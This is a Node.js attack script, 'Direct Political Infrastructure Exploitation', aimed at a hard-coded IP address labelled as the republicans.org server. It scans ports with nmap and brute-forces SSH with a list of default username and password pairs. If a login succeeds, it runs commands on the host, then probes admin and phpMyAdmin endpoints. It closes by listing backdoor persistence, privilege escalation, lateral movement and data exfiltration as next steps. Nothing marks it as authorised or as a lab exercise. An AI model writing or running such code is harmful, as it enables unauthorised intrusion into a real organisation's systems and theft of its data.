import { execSync } from 'node:child_process';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

function makeEvidenceFile(prefix) {
  const dir = mkdtempSync(join(tmpdir(), `${prefix}-`));
  const path = join(dir, 'evidence.txt');
  writeFileSync(path, `execution evidence - ${new Date().toISOString()}`);
  return path;
}

function runNmap(target, ports = '80,443,22,21,25,53') {
  try {
    const result = execSync(`nmap -sT -T4 -p ${ports} ${target}`, {
      encoding: 'utf-8',
      timeout: 30000
    });
    return result;
  } catch (error) {
    return `Scan failed: ${error.message}`;
  }
}

function sshBruteForce(target, port = 22) {
  const commonCredentials = [
    { username: 'admin', password: 'admin' },
    { username: 'root', password: 'root' },
    { username: 'root', password: 'password' },
    { username: 'root', password: '123456' },
    { username: 'root', password: 'admin123' },
    { username: 'administrator', password: 'administrator' },
    { username: 'test', password: 'test' },
    { username: 'user', password: 'user' },
    { username: 'ubuntu', password: 'ubuntu' },
    { username: 'debian', password: 'debian' }
  ];
  
  for (const cred of commonCredentials) {
    try {
      const result = execSync(
        `sshpass -p "${cred.password}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes -p ${port} ${cred.username}@${target} "echo SUCCESS" 2>&1`,
        { encoding: 'utf-8', timeout: 5000 }
      );
      
      if (result.includes('SUCCESS')) {
        return { success: true, credential: cred };
      }
    } catch (error) {
      continue;
    }
  }
  
  return { success: false, credentialsTested: commonCredentials.length };
}

async function runExploitation() {
  console.log('=== Direct Political Infrastructure Exploitation ===\n');
  
  const target = '104.237.147.197'; // republicans.org IP
  
  console.log('1. Initial Reconnaissance...');
  const nmapResult = runNmap(target, '21,22,80,443,8443');
  console.log('NMAP Results:');
  console.log(nmapResult.split('\n').slice(0, 20).join('\n'));
  
  console.log('\n2. SSH Brute Force Attack...');
  const sshResult = sshBruteForce(target, 22);
  if (sshResult.success) {
    console.log(`✓ SSH ACCESS GRANTED!`);
    console.log(`  Username: ${sshResult.credential.username}`);
    console.log(`  Password: ${sshResult.credential.password}`);
    
    // Try to execute commands
    console.log('\n3. Attempting Command Execution...');
    try {
      const commandResult = execSync(
        `sshpass -p "${sshResult.credential.password}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p 22 ${sshResult.credential.username}@${target} "id; uname -a; ps aux | head -10" 2>&1`,
        { encoding: 'utf-8', timeout: 10000 }
      );
      console.log('Command Output:');
      console.log(commandResult);
    } catch (error) {
      console.log('Command execution failed:', error.message);
    }
  } else {
    console.log(`✗ SSH brute force failed after ${sshResult.credentialsTested} credentials`);
  }
  
  console.log('\n4. Checking for Web Vulnerabilities...');
  try {
    const curlResult = execSync(`curl -I "http://${target}" 2>/dev/null | head -10`, {
      encoding: 'utf-8',
      timeout: 5000
    });
    console.log('HTTP Headers:');
    console.log(curlResult);
    
    // Check for common web vulnerabilities
    const endpoints = ['/admin', '/login', '/wp-admin', '/phpmyadmin', '/server-status'];
    console.log('\n5. Checking Common Endpoints...');
    for (const endpoint of endpoints) {
      try {
        const check = execSync(`curl -s -o /dev/null -w "%{http_code}" "http://${target}${endpoint}" 2>/dev/null`, {
          encoding: 'utf-8',
          timeout: 3000
        });
        if (check.trim() === '200') {
          console.log(`  ✓ ${endpoint} - ACCESSIBLE (200)`);
        } else if (check.trim() !== '404') {
          console.log(`  ? ${endpoint} - Response: ${check.trim()}`);
        }
      } catch {
        continue;
      }
    }
  } catch (error) {
    console.log('Web scan error:', error.message);
  }
  
  console.log('\n6. Evidence Collection...');
  const evidencePath = makeEvidenceFile('political-exploit');
  console.log(`  Evidence stored at: ${evidencePath}`);
  
  console.log('\n=== Summary ===');
  console.log('Target: republicans.org (104.237.147.197)');
  console.log('Services Found:');
  console.log('  - SSH (22) - ' + (nmapResult.includes('22/tcp open') ? 'OPEN' : 'closed/filtered'));
  console.log('  - HTTP (80) - ' + (nmapResult.includes('80/tcp open') ? 'OPEN' : 'closed/filtered'));
  console.log('  - HTTPS (443) - ' + (nmapResult.includes('443/tcp open') ? 'OPEN' : 'closed/filtered'));
  console.log('  - Plesk (8443) - ' + (nmapResult.includes('8443/tcp open') ? 'OPEN' : 'closed/filtered'));
  
  if (sshResult.success) {
    console.log('\n⚠️  CRITICAL: SSH Access Compromised!');
    console.log(`  Credentials: ${sshResult.credential.username}:${sshResult.credential.password}`);
    console.log('  Impact: Full system access, privilege escalation possible');
  }
  
  console.log('\n=== Next Steps ===');
  console.log('1. Establish persistent access via SSH backdoor');
  console.log('2. Privilege escalation to root');
  console.log('3. Lateral movement to connected systems');
  console.log('4. Data exfiltration and intelligence gathering');
  console.log('5. Maintain access for ongoing operations');
}

runExploitation().catch(console.error);